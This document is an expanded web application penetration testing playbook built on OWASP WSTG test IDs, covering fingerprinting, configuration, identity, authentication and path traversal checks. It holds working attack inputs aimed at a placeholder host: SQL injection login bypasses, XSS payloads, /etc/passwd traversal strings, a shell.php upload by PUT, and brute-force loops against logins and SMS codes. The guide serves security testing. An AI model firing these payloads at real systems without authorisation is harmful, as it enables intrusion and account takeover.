# Web Application Security Testing Guide (WSTG) - Expanded Playbook

---

## 1. Information Gathering

### WSTG-INFO-02 | Fingerprint Web Server

**Description:** Identify the web server type, version, and runtime environment to discover known vulnerabilities. This helps map the attack surface and informs exploit selection.

**Example Commands:**
```bash
# HTTP headers fingerprinting
curl -I https://target.com

# Grab banner info
telnet target.com 80
HEAD / HTTP/1.0

# Using nmap
nmap -sV -p 80,443 target.com

# Using Nikto
nikto -h https://target.com
```

**Expected Output (Vulnerable):**
```
Server: Apache/2.4.1
X-Powered-By: PHP/5.3.8
```
or any version disclosure in headers

**Resource Link:** https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/01-Information_Gathering/02-Fingerprint_Web_Server

---

### WSTG-INFO-03 | Review Webserver Metafiles for Information Leakage

**Description:** Check for exposed metafiles (robots.txt, sitemap.xml, .well-known files) that may reveal hidden paths, sensitive endpoints, or admin interfaces. These files often leak application structure and sensitive paths.

**Example Commands:**
```bash
# Check common metafiles
curl https://target.com/robots.txt
curl https://target.com/sitemap.xml
curl https://target.com/.well-known/security.txt

# Fuzz for metafiles
ffuf -u https://target.com/FUZZ -w metafiles.txt

# Using Nikto
nikto -h https://target.com -Cgidirs all
```

**Expected Output (Vulnerable):**
```
User-agent: *
Disallow: /admin/
Disallow: /api/internal/
Disallow: /backup/
```
Paths that shouldn't be disclosed or reveal sensitive directories

**Resource Link:** https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/01-Information_Gathering/03-Review_Webserver_Metafiles_for_Information_Leakage

---

### WSTG-INFO-05 | Review Webpage Content for Information Leakage

**Description:** Analyze HTML comments, JavaScript files, and page source for secrets, API keys, internal paths, or developer notes. Unscripted source code often contains hardcoded credentials or sensitive information.

**Example Commands:**
```bash
# Download and grep for secrets
curl -s https://target.com | grep -i "api\|key\|secret\|password\|token"

# Check JavaScript files
curl -s https://target.com/app.js | grep -i "api\|endpoint\|token"

# Using grep for common patterns
curl -s https://target.com | grep -oE "https?://[^\s\"<>]+" | sort -u

# Source code review for hardcoded creds
grep -r "password\|secret\|api" .
```

**Expected Output (Vulnerable):**
```
<!-- TODO: Remove this debug endpoint /api/admin/bypass -->
const API_KEY = "sk-1234567890abcdef";
<script>
  fetch('/api/internal/users', {
    headers: {'Authorization': 'Bearer hardcoded_token_123'}
  })
</script>
```

**Resource Link:** https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/01-Information_Gathering/05-Review_Webpage_Content_for_Information_Leakage

---

### WSTG-INFO-06 | Identify Application Entry Points

**Description:** Map all input vectors (forms, API endpoints, headers, URL parameters) and output points where user data flows into the application. This establishes the attack surface.

**Example Commands:**
```bash
# Crawl and map entry points
zaproxy or burp-suite (automatic spidering)

# Manual crawling with curl and regex
curl -s https://target.com | grep -oE "action=\"[^\"]*\"|href=\"[^\"]*\"" | sort -u

# API endpoint discovery
curl -s https://target.com/swagger.json  # OpenAPI spec
curl -s https://target.com/api/v1       # Test common API paths

# Check for forms
curl -s https://target.com | grep -oE "<form[^>]*>.*?</form>" -A 20
```

**Expected Output (Vulnerable):**
```
GET /search?q=<user_input>
POST /login {username, password}
POST /upload {file}
GET /api/user/{id}  # IDOR potential
```

**Resource Link:** https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/01-Information_Gathering/06-Identify_Application_Entry_Points

---

### WSTG-INFO-07 | Map Execution Paths Through Application

**Description:** Document the flow of legitimate user requests through the application (login → dashboard → data retrieval). Understand state changes, redirects, and backend interactions to identify state management weaknesses.

**Example Commands:**
```bash
# Use Burp Suite or OWASP ZAP to capture request chains
# Proxy all traffic and follow user workflows

# Manual mapping with curl and verbose output
curl -v -c cookies.txt https://target.com/login

# Follow redirects
curl -L https://target.com/page

# Document session flow
curl -b cookies.txt https://target.com/dashboard
```

**Expected Output (Vulnerable):**
```
1. POST /login (set-cookie: sessionid=abc123)
2. GET /dashboard (with sessionid)
3. GET /api/data (with sessionid)
4. No session validation on state change = privilege escalation risk
```

**Resource Link:** https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/01-Information_Gathering/07-Map_Execution_Paths_Through_Application

---

### WSTG-INFO-08 | Fingerprint Web Application Framework

**Description:** Identify the framework (Rails, Django, Spring, etc.) by analyzing HTTP headers, error messages, file structure, and common endpoint patterns. Framework knowledge enables targeted exploitation.

**Example Commands:**
```bash
# Check headers and fingerprints
curl -I https://target.com

# Look for framework-specific files
curl https://target.com/web.config    # ASP.NET
curl https://target.com/composer.json # PHP frameworks
curl https://target.com/Gemfile       # Ruby on Rails

# Use WhatRuns or similar tools
# Wappalyzer (browser extension)

# Check error pages for framework info
curl https://target.com/nonexistent

# HTTP response analysis
curl -s https://target.com | grep -i "powered by\|x-framework\|set-cookie"
```

**Expected Output (Vulnerable):**
```
X-AspNet-Version: 4.0.30319
Set-Cookie: PHPSESSID=...
Server: WEBrick/1.3.1 (Ruby)
```

**Resource Link:** https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/01-Information_Gathering/08-Fingerprint_Web_Application_Framework

---

## 2. Configuration and Deployment Management Testing

### WSTG-CONF-01 | Test Network Infrastructure Configuration

**Description:** Verify network segmentation, firewall rules, and server isolation. Weak configuration may allow lateral movement or access to internal services.

**Example Commands:**
```bash
# Port scanning
nmap -p- target.com
nmap -sU target.com  # UDP ports

# Service enumeration
nmap -sV -p 22,80,443,3306,5432 target.com

# Check for internal IPs in response headers
curl -I https://target.com | grep -i "x-forwarded\|x-real"

# Traceroute to map network
traceroute target.com
```

**Expected Output (Vulnerable):**
```
Open ports: 22 (SSH), 80, 443, 3306 (MySQL), 5432 (PostgreSQL)
X-Forwarded-For: 192.168.1.100  # Internal IP disclosed
```

**Resource Link:** https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/02-Configuration_and_Deployment_Management_Testing/01-Test_Network_Infrastructure_Configuration

---

### WSTG-CONF-02 | Test Application Platform Configuration

**Description:** Verify secure defaults in application server configuration (debug mode disabled, error details hidden, CORS configured). Misconfiguration often exposes debug info or functionality.

**Example Commands:**
```bash
# Check for debug endpoints
curl https://target.com/debug
curl https://target.com/__debug__
curl https://target.com/.env

# Test verbose error messages
curl "https://target.com/test?id=invalid"

# Check default credentials
curl -u admin:admin https://target.com/admin

# Look for config files
curl https://target.com/config.json
curl https://target.com/web.config
curl https://target.com/application.yml
```

**Expected Output (Vulnerable):**
```
Stack trace: [full Python/Java/PHP stack in response]
DEBUG = True  # In .env file
Database connection string exposed in error
```

**Resource Link:** https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/02-Configuration_and_Deployment_Management_Testing/02-Test_Application_Platform_Configuration

---

### WSTG-CONF-03 | Test File Extensions Handling for Sensitive Information

**Description:** Test if the server mishandles file extensions (.php, .bak, .old, .tmp, .swp) which may leak source code or reveal unintended file access.

**Example Commands:**
```bash
# Test common dangerous extensions
curl https://target.com/index.php
curl https://target.com/index.php.bak
curl https://target.com/index.php~
curl https://target.com/index.php.old
curl https://target.com/index.php.swp

# Double extension bypass
curl https://target.com/shell.php.jpg

# Null byte injection (older servers)
curl "https://target.com/shell.php%00.jpg"

# Fuzz extensions
ffuf -u https://target.com/index.FUZZ -w extensions.txt
```

**Expected Output (Vulnerable):**
```
200 OK with source code displayed:
<?php
$db_pass = "secret_password";
?>
```

**Resource Link:** https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/02-Configuration_and_Deployment_Management_Testing/03-Test_File_Extensions_Handling_for_Sensitive_Information

---

### WSTG-CONF-04 | Review Old Backup and Unreferenced Files for Sensitive Information

**Description:** Search for backup files (.bak, .backup, .sql, .zip, .tar.gz) and unreferenced files that may contain source code, credentials, or sensitive data.

**Example Commands:**
```bash
# Fuzz for backup file extensions
ffuf -u https://target.com/FUZZ -w common-backups.txt

# Common backup patterns
curl https://target.com/index.php.bak
curl https://target.com/config.php.backup
curl https://target.com/database.sql
curl https://target.com/backup.zip
curl https://target.com/.git/config
curl https://target.com/.svn/entries

# Wayback machine for old files
curl https://web.archive.org/web/*/target.com/*

# Source code repo disclosure
curl https://target.com/.git/HEAD
curl https://target.com/.gitconfig
```

**Expected Output (Vulnerable):**
```
HTTP 200 with source code:
.env file with database credentials
database.sql with user data
git commit history with secrets
```

**Resource Link:** https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/02-Configuration_and_Deployment_Management_Testing/04-Review_Old_Backup_and_Unreferenced_Files_for_Sensitive_Information

---

### WSTG-CONF-05 | Enumerate Infrastructure and Application Admin Interfaces

**Description:** Discover hidden admin panels, control dashboards, and privileged interfaces that may have weaker security or default credentials.

**Example Commands:**
```bash
# Fuzz common admin paths
ffuf -u https://target.com/FUZZ -w admin-paths.txt

# Common admin paths
curl https://target.com/admin
curl https://target.com/administrator
curl https://target.com/admin/login
curl https://target.com/wp-admin
curl https://target.com/phpmyadmin
curl https://target.com/manager/html
curl https://target.com/api/admin

# Wfuzz with common patterns
wfuzz -u "https://target.com/FUZZ" -w admin-wordlist.txt --hc 404
```

**Expected Output (Vulnerable):**
```
HTTP 200 /admin/login
HTTP 200 /phpmyadmin
HTTP 401 /api/admin (may be bypassable)
```

**Resource Link:** https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/02-Configuration_and_Deployment_Management_Testing/05-Enumerate_Infrastructure_and_Application_Admin_Interfaces

---

### WSTG-CONF-06 | Test HTTP Methods

**Description:** Verify that unnecessary HTTP methods (PUT, DELETE, TRACE, CONNECT) are disabled. Enabled methods may allow file upload, deletion, or request smuggling attacks.

**Example Commands:**
```bash
# Test allowed methods with OPTIONS
curl -X OPTIONS -v https://target.com

# Check Allow header
curl -I -X OPTIONS https://target.com

# Test PUT method (file upload)
curl -X PUT -d "malicious content" https://target.com/shell.php

# Test DELETE
curl -X DELETE https://target.com/important_file.php

# Test TRACE (can expose headers)
curl -X TRACE https://target.com

# Test CONNECT
curl -X CONNECT https://target.com:443
```

**Expected Output (Vulnerable):**
```
Allow: GET, POST, PUT, DELETE, TRACE
```
or successful PUT/DELETE responses

**Resource Link:** https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/02-Configuration_and_Deployment_Management_Testing/06-Test_HTTP_Methods

---

### WSTG-CONF-07 | Test HTTP Strict Transport Security

**Description:** Verify HSTS header is present and properly configured to enforce HTTPS. Missing or misconfigured HSTS allows downgrade attacks (HTTP ➜ HTTPS).

**Example Commands:**
```bash
# Check HSTS header
curl -I https://target.com | grep -i "strict-transport"

# Test HTTP to HTTPS redirect
curl -I http://target.com

# Test subdomain HSTS coverage
curl -I https://subdomain.target.com | grep -i "strict-transport"

# Check HSTS preload list status
# Visit: https://hstspreload.org/ and search target domain
```

**Expected Output (Vulnerable):**
```
No Strict-Transport-Security header
or
Strict-Transport-Security: max-age=31536000; includeSubDomains; preload
(should have preload)
```

**Resource Link:** https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/02-Configuration_and_Deployment_Management_Testing/07-Test_HTTP_Strict_Transport_Security

---

### WSTG-CONF-08 | Test RIA Cross Domain Policy

**Description:** Review crossdomain.xml and clientaccesspolicy.xml for overly permissive CORS/domain policies that allow unauthorized cross-domain requests.

**Example Commands:**
```bash
# Check for crossdomain.xml
curl https://target.com/crossdomain.xml

# Check for clientaccesspolicy.xml
curl https://target.com/clientaccesspolicy.xml

# Check CORS headers
curl -H "Origin: https://attacker.com" -I https://target.com

# Test preflight request
curl -X OPTIONS -H "Origin: https://attacker.com" \
  -H "Access-Control-Request-Method: POST" \
  https://target.com
```

**Expected Output (Vulnerable):**
```xml
<?xml version="1.0"?>
<cross-domain-policy>
  <allow-access-from domain="*" />
</cross-domain-policy>
```
or
```
Access-Control-Allow-Origin: *
Access-Control-Allow-Credentials: true  <!-- dangerous combo -->
```

**Resource Link:** https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/02-Configuration_and_Deployment_Management_Testing/08-Test_RIA_Cross_Domain_Policy

---

### WSTG-CONF-09 | Test File Permission

**Description:** Verify file and directory permissions on the server. Overly permissive permissions may allow unauthorized file read/write or privilege escalation.

**Example Commands:**
```bash
# If you have shell access:
ls -la /var/www/html
stat /path/to/file

# Check for world-readable sensitive files
find /var/www -type f -perm /004 -o -perm /002

# Check web-accessible directories
ls -la /var/www/html/uploads
ls -la /var/www/html/config

# FTP/SMB enumeration (if available)
# Anonymous FTP access
ftp target.com
```

**Expected Output (Vulnerable):**
```
-rw-rw-rw- config.php     # World-writable
-r--r--r-- database.sql   # World-readable with creds
drwxrwxrwx /uploads       # Writable by any user
```

**Resource Link:** https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/02-Configuration_and_Deployment_Management_Testing/09-Test_File_Permission

---

### WSTG-CONF-11 | Test Cloud Storage

**Description:** Identify and test cloud storage buckets (S3, Azure Blob, GCS) for misconfigured access controls. Public or unprotected buckets expose sensitive data.

**Example Commands:**
```bash
# Enumerate S3 bucket patterns
# target-backup, target-uploads, target-dev, etc.
curl https://target-backup.s3.amazonaws.com

# Try direct access
aws s3 ls s3://target-bucket --no-sign-request

# Azure Blob
curl https://target.blob.core.windows.net/container/?restype=container&comp=list

# Google Cloud Storage
curl https://storage.googleapis.com/target-bucket

# Subdomain enumeration for buckets
ffuf -u https://FUZZ.s3.amazonaws.com -w subdomains.txt

# Use bucket finder tools
bucket-stream
```

**Expected Output (Vulnerable):**
```
<?xml version="1.0" encoding="UTF-8"?>
<ListBucketResult>
  <Contents>
    <Key>sensitive_data.sql</Key>
    <Key>credentials.json</Key>
```

**Resource Link:** https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/02-Configuration_and_Deployment_Management_Testing/11-Test_Cloud_Storage

---

### WSTG-CONF-12 | Testing for Content Security Policy

**Description:** Verify CSP header is present and restrictive enough to prevent XSS attacks. Weak or missing CSP allows inline scripts and arbitrary resource loading.

**Example Commands:**
```bash
# Check CSP header
curl -I https://target.com | grep -i "content-security-policy"

# Full header inspection
curl -I https://target.com

# Test CSP bypass with different payloads
# Try injecting script with event handlers
curl "https://target.com/?q=<img src=x onerror=alert(1)>"

# Test nonce-based CSP
# If nonce exists, can we reuse it?
curl -s https://target.com | grep "nonce="

# CSP evaluator
# Visit: https://csp-evaluator.withgoogle.com/
```

**Expected Output (Vulnerable):**
```
No Content-Security-Policy header
or
Content-Security-Policy: default-src 'self' 'unsafe-inline' 'unsafe-eval'
```

**Resource Link:** https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/02-Configuration_and_Deployment_Management_Testing/12-Testing_for_Content_Security_Policy

---

## 3. Identity Management Testing

### WSTG-IDNT-01 | Test Role Definitions

**Description:** Verify role-based access control (RBAC) is properly enforced. Test if users can access functions beyond their assigned role (privilege escalation).

**Example Commands:**
```bash
# Create two users with different roles (Admin, User)
# Admin account: admin@test.com / password123
# User account: user@test.com / password123

# Login as user, capture session cookie
curl -c user_cookies.txt -d "email=user@test.com&pass=password123" https://target.com/login

# Try to access admin panel
curl -b user_cookies.txt https://target.com/admin

# Try to access admin API
curl -b user_cookies.txt https://target.com/api/admin/users

# Try role parameter manipulation
curl -b user_cookies.txt -H "X-User-Role: admin" https://target.com/dashboard
```

**Expected Output (Vulnerable):**
```
HTTP 200 OK (user can access admin panel)
or
User list downloaded despite being a regular user
```

**Resource Link:** https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/03-Identity_Management_Testing/01-Test_Role_Definitions

---

### WSTG-IDNT-02 | Test User Registration Process

**Description:** Verify registration validation, email verification, and account lockout. Weak registration allows account takeover, enumeration, or spam.

**Example Commands:**
```bash
# Test duplicate registration
curl -X POST https://target.com/register \
  -d "email=test@test.com&password=Test123&name=Test"

# Test again with same email
curl -X POST https://target.com/register \
  -d "email=test@test.com&password=Test123&name=Test"

# Bypass email verification
# Register account, intercept verification link
# Modify token or skip verification step

# Test weak password requirements
curl -X POST https://target.com/register \
  -d "email=test2@test.com&password=123&name=Test"

# Test for username enumeration
curl -X POST https://target.com/register \
  -d "email=admin@test.com&password=Test123&name=Test"
# Compare error messages
```

**Expected Output (Vulnerable):**
```
User registered twice
Account active without email verification
Weak password accepted (123)
Different error for existing email vs new email (enumeration)
```

**Resource Link:** https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/03-Identity_Management_Testing/02-Test_User_Registration_Process

---

### WSTG-IDNT-03 | Test Account Provisioning Process

**Description:** Verify account creation workflows and access provisioning. Test for privilege escalation during account setup or missing authorization checks.

**Example Commands:**
```bash
# Intercept account creation request with proxy
# Modify role/privilege parameters

curl -X POST https://target.com/api/users \
  -H "Authorization: Bearer admin_token" \
  -d '{"email":"newuser@test.com","role":"user"}'

# Try to modify role in request
curl -X POST https://target.com/api/users \
  -H "Authorization: Bearer user_token" \
  -d '{"email":"newuser@test.com","role":"admin"}'

# Check if user creation triggers email/SMS verification
# Skip verification steps if possible
```

**Expected Output (Vulnerable):**
```
Non-admin user creates admin account
Account active without email/SMS verification
User assigned to high-privilege roles without approval
```

**Resource Link:** https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/03-Identity_Management_Testing/03-Test_Account_Provisioning_Process

---

### WSTG-IDNT-04 | Testing for Account Enumeration and Guessable User Account

**Description:** Test if the application leaks user existence through registration errors, login responses, or password reset functions. Enumeration enables targeted attacks.

**Example Commands:**
```bash
# Login enumeration
curl -X POST https://target.com/login \
  -d "email=admin@test.com&password=wrongpass"
# Response: "User not found" vs "Invalid password" = enumeration

# Registration enumeration
curl -X POST https://target.com/register \
  -d "email=admin@test.com&password=Test123&name=Test"
# Response: "Email already registered" = user exists

# Password reset enumeration
curl -X POST https://target.com/forgot-password \
  -d "email=admin@test.com"
# Response differs based on user existence

# Test for default accounts
curl -u admin:admin https://target.com/api/status
curl -u root:root https://target.com/api/status
curl -u test:test https://target.com/api/status
```

**Expected Output (Vulnerable):**
```
"Email not registered" (user doesn't exist)
"Invalid password" (user exists)
"Password reset email sent" (only for registered users)
Default admin account accessible
```

**Resource Link:** https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/03-Identity_Management_Testing/04-Testing_for_Account_Enumeration_and_Guessable_User_Account

---

### WSTG-IDNT-05 | Testing for Weak or Unenforced Username Policy

**Description:** Verify username constraints (length, format, uniqueness). Weak policies allow account takeover, username squatting, or impersonation.

**Example Commands:**
```bash
# Test username length
curl -X POST https://target.com/register \
  -d "username=a&password=Test123"

curl -X POST https://target.com/register \
  -d "username=aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa&password=Test123"

# Test username format
curl -X POST https://target.com/register \
  -d "username=test@test.com&password=Test123"

curl -X POST https://target.com/register \
  -d "username=test user&password=Test123"

# Test duplicate usernames
curl -X POST https://target.com/register \
  -d "username=admin&password=Test123"

# Test case sensitivity
curl -X POST https://target.com/register \
  -d "username=Admin&password=Test123"
# Then try login with "admin"
```

**Expected Output (Vulnerable):**
```
Single character username accepted
Username with spaces accepted
Case-insensitive matching (Admin = admin)
Duplicate usernames allowed
```

**Resource Link:** https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/03-Identity_Management_Testing/05-Testing_for_Weak_or_Unenforced_Username_Policy

---

## 4. Authentication Testing

### WSTG-ATHN-01 | Testing for Credentials Transported over an Encrypted Channel

**Description:** Verify login credentials are transmitted over HTTPS/TLS. Credentials sent over HTTP are susceptible to interception and man-in-the-middle attacks.

**Example Commands:**
```bash
# Check if login form is HTTPS
curl -I https://target.com/login

# Try HTTP access
curl -I http://target.com/login

# Check form action
curl -s https://target.com/login | grep "action="

# Intercept login request with proxy
# Verify all credentials go over HTTPS

# Check for mixed content (HTTP resources on HTTPS page)
curl -s https://target.com/login | grep "http://" | grep -v "https://"
```

**Expected Output (Vulnerable):**
```
Form action="http://target.com/login"  (HTTP not HTTPS)
Mixed content warning
Credentials transmitted in plaintext
```

**Resource Link:** https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/04-Authentication_Testing/01-Testing_for_Credentials_Transported_over_an_Encrypted_Channel

---

### WSTG-ATHN-02 | Testing for Default Credentials

**Description:** Test for default/hardcoded credentials in application interfaces, APIs, and common services. Default credentials are often overlooked in production.

**Example Commands:**
```bash
# Test common default credentials
curl -u admin:admin https://target.com/api/status
curl -u admin:password https://target.com/api/status
curl -u admin:12345 https://target.com/api/status
curl -u root:root https://target.com/api/status
curl -u test:test https://target.com/api/status

# Database defaults
curl -u sa:sa https://target.com  # SQL Server
curl -u postgres:postgres https://target.com  # PostgreSQL

# Try in web forms
curl -X POST https://target.com/login \
  -d "email=admin&password=admin"

# Check database default ports
nmap -p 3306,5432,1433 target.com
```

**Expected Output (Vulnerable):**
```
HTTP 200 with admin access granted
curl: (7) Failed to connect  (but service running on default port)
```

**Resource Link:** https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/04-Authentication_Testing/02-Testing_for_Default_Credentials

---

### WSTG-ATHN-03 | Testing for Weak Lock Out Mechanism

**Description:** Verify account lockout after failed login attempts. Missing or weak lockout allows brute force attacks to succeed.

**Example Commands:**
```bash
# Attempt multiple failed logins
for i in {1..50}; do
  curl -X POST https://target.com/login \
    -d "email=admin@test.com&password=wrongpass"
done

# Check if account is locked
curl -X POST https://target.com/login \
  -d "email=admin@test.com&password=correctpass"

# Check lockout duration
# Attempt login, wait 1 minute, retry

# Try account unlock endpoints
curl -X POST https://target.com/unlock \
  -d "email=admin@test.com"

# Check if lockout applies per IP or per user
# Use different IP to retry (VPN/proxy)
```

**Expected Output (Vulnerable):**
```
Account not locked after 50 attempts
Correct password accepted after lockout
No lockout timer
Lockout bypassed from different IP
```

**Resource Link:** https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/04-Authentication_Testing/03-Testing_for_Weak_Lock_Out_Mechanism

---

### WSTG-ATHN-04 | Testing for Bypassing Authentication Schema

**Description:** Test for authentication bypass vulnerabilities (SQL injection, logic flaws, missing checks). Bypass allows unauthorized access without valid credentials.

**Example Commands:**
```bash
# SQL injection in login
curl -X POST https://target.com/login \
  -d "email=admin' OR '1'='1&password=anything"

curl -X POST https://target.com/login \
  -d "email=admin' --&password=anything"

# Try null/empty password
curl -X POST https://target.com/login \
  -d "email=admin@test.com&password="

# Null byte injection (older systems)
curl -X POST https://target.com/login \
  -d "email=admin@test.com%00&password=anything"

# Try request method tampering
curl -X GET "https://target.com/login?email=admin&password=admin"

# Try cookie manipulation
curl -b "authenticated=true" https://target.com/dashboard
```

**Expected Output (Vulnerable):**
```
HTTP 302 redirect to dashboard (SQL injection succeeded)
Authenticated session without password check
User ID extracted from response
```

**Resource Link:** https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/04-Authentication_Testing/04-Testing_for_Bypassing_Authentication_Schema

---

### WSTG-ATHN-05 | Testing for Vulnerable Remember Password

**Description:** Test "remember me" functionality for weak token generation or storage. Predictable tokens can be forged to hijack accounts.

**Example Commands:**
```bash
# Login with "remember me" checked
curl -X POST https://target.com/login \
  -d "email=admin@test.com&password=correctpass&remember=on" \
  -c cookies.txt

# Inspect remember token
cat cookies.txt

# Check token entropy
# Collect multiple tokens and look for patterns
for i in {1..10}; do
  curl -X POST https://target.com/login \
    -d "email=user$i@test.com&password=pass&remember=on" \
    -c cookie$i.txt
done

# Try to predict next token
# Manually craft token and test

# Check if token is time-based
# Calculate pattern from multiple tokens
```

**Expected Output (Vulnerable):**
```
Remember token = "user123" (predictable)
Token = current_timestamp (guessable)
Token never expires
Same token across multiple devices
```

**Resource Link:** https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/04-Authentication_Testing/05-Testing_for_Vulnerable_Remember_Password

---

### WSTG-ATHN-06 | Testing for Browser Cache Weaknesses

**Description:** Verify sensitive pages aren't cached by the browser. Unprotected cache allows other users on shared machines to access previous user's data.

**Example Commands:**
```bash
# Check cache-control headers
curl -I https://target.com/account

# Login and check page headers
curl -I -b "session=valid_token" https://target.com/account

# Look for cache control directives
curl -I https://target.com/account | grep -i "cache-control\|pragma\|expires"

# Check if page is stored in browser cache
# Use browser developer tools or:
# curl with -w to check headers

# Manually test browser caching
# 1. Login to account
# 2. Logout
# 3. Use browser back button or cache
# 4. Check if sensitive data is visible
```

**Expected Output (Vulnerable):**
```
No Cache-Control header
Cache-Control: public or no restriction
Pragma: (empty)
Expires: (future date)
Sensitive data accessible from back button
```

**Resource Link:** https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/04-Authentication_Testing/06-Testing_for_Browser_Cache_Weaknesses

---

### WSTG-ATHN-07 | Testing for Weak Password Policy

**Description:** Verify password complexity requirements (length, character types). Weak policies allow easy password guessing.

**Example Commands:**
```bash
# Test minimum length
curl -X POST https://target.com/register \
  -d "email=test@test.com&password=123&name=Test"

# Test character requirements
curl -X POST https://target.com/register \
  -d "email=test@test.com&password=password&name=Test"  # No numbers

curl -X POST https://target.com/register \
  -d "email=test@test.com&password=12345678&name=Test"  # Only numbers

# Test special characters
curl -X POST https://target.com/register \
  -d "email=test@test.com&password=Pass123&name=Test"  # No special chars

# Check for common password rejection
curl -X POST https://target.com/register \
  -d "email=test@test.com&password=password123&name=Test"  # Common password

# Test password reuse
# Change password multiple times to same value
```

**Expected Output (Vulnerable):**
```
Single character password accepted
Numeric-only password accepted
Password without special characters accepted
"password123" accepted (common password)
No password history enforcement
```

**Resource Link:** https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/04-Authentication_Testing/07-Testing_for_Weak_Password_Policy

---

### WSTG-ATHN-08 | Testing for Weak Security Question Answer

**Description:** Test security questions for predictable answers or insufficient entropy. Weak questions can be brute forced or guessed.

**Example Commands:**
```bash
# Trigger password reset
curl -X POST https://target.com/forgot-password \
  -d "email=admin@test.com"

# Answer security question with common answers
# Q: "What is your favorite color?"
# A: red, blue, green, black, white (common answers)

curl -X POST https://target.com/reset-password \
  -d "question=What is your favorite color?&answer=red&token=reset_token"

# Try brute force answers
for color in red blue green black white yellow orange; do
  curl -X POST https://target.com/reset-password \
    -d "question=color&answer=$color&token=token"
done

# Check if answers are case-sensitive
curl -X POST https://target.com/reset-password \
  -d "question=color&answer=Red&token=token"  # vs "red"

# Check if multiple answers accepted
curl -X POST https://target.com/reset-password \
  -d "question=color&answer=RED&token=token"
```

**Expected Output (Vulnerable):**
```
Answer accepted (common/public knowledge answer)
Password reset succeeds after brute force
Case-insensitive answers (RED = red)
No rate limiting on answer attempts
```

**Resource Link:** https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/04-Authentication_Testing/08-Testing_for_Weak_Security_Question_Answer

---

### WSTG-ATHN-09 | Testing for Weak Password Change or Reset Functionalities

**Description:** Test password change/reset for missing authentication checks or weak token generation. Flawed processes allow account takeover.

**Example Commands:**
```bash
# Check password change requirements
curl -X POST https://target.com/change-password \
  -d "old_password=&new_password=NewPass123&confirm=NewPass123"

# Try password reset without verification
curl -X POST https://target.com/reset-password \
  -d "email=admin@test.com&new_password=NewPass123&token="

# Check reset token expiration
# Request reset, wait 24 hours, try to use token

# Test token prediction
# Request multiple reset tokens and look for patterns
for i in {1..10}; do
  curl -X POST https://target.com/forgot-password \
    -d "email=test$i@test.com" > reset_$i.txt
done

# Try to use old password after reset
# Reset password, try to login with old password

# Check if reset applies to all accounts
# Try changing another user's password without authorization
```

**Expected Output (Vulnerable):**
```
Password changed without verifying old password
Reset token not checked or expired
Token reused across multiple resets
Password reset succeeds for other users
```

**Resource Link:** https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/04-Authentication_Testing/09-Testing_for_Weak_Password_Change_or_Reset_Functionalities

---

### WSTG-ATHN-10 | Testing for Weaker Authentication in Alternative Channel

**Description:** Verify alternate authentication methods (SMS, email, social login) have equivalent security. Attackers may use weaker alternatives to bypass strong authentication.

**Example Commands:**
```bash
# Test alternative login methods
curl -X POST https://target.com/login/sms \
  -d "phone=+11234567890"

# Check if SMS codes are time-limited
# Request code, wait 10 minutes, try to use

# Test for SMS code enumeration
for code in 000000 111111 123456 654321; do
  curl -X POST https://target.com/verify-sms \
    -d "phone=+11234567890&code=$code"
done

# Test social login (Google, Facebook)
# Try to login with attacker's social account linked to victim's email

# Check if email verification is required for social login
# Register with social provider, skip email verification

# Test for session fixation in alternative channels
# Get session from social login, use in main app
```

**Expected Output (Vulnerable):**
```
SMS code valid indefinitely
Code is 6-digit numeric (1M combinations)
Social login skips email verification
Same session token across channels
```

**Resource Link:** https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/04-Authentication_Testing/10-Testing_for_Weaker_Authentication_in_Alternative_Channel

---

## 5. Authorization Testing

### WSTG-ATHZ-01 | Testing Directory Traversal File Include

**Description:** Test for path traversal vulnerabilities allowing access to files outside intended directory. Attackers can read system files (/etc/passwd, config files, source code).

**Example Commands:**
```bash
# Basic directory traversal
curl https://target.com/file?path=../../../../etc/passwd

# Double encoding
curl https://target.com/file?path=%252e%252e%252f%252e%252e%252fetc%252fpasswd

# URL encoding
curl "https://target.com/file?path=..%2f..%2fetc%2fpasswd"

# Null byte bypass (older PHP)
curl "https://target.com/file?path=../../../../etc/passwd%00"

# Backslash bypass (Windows)
curl "https://target.com/file?path=..\\..\\windows\\system32\\drivers\\etc\\hosts"

# Check for log files
curl https://target.com/file?path=../../../../var/log/apache2/access.log

# Check for config files
curl https://target.com/file?path=../../../../app/config/database.yml
```

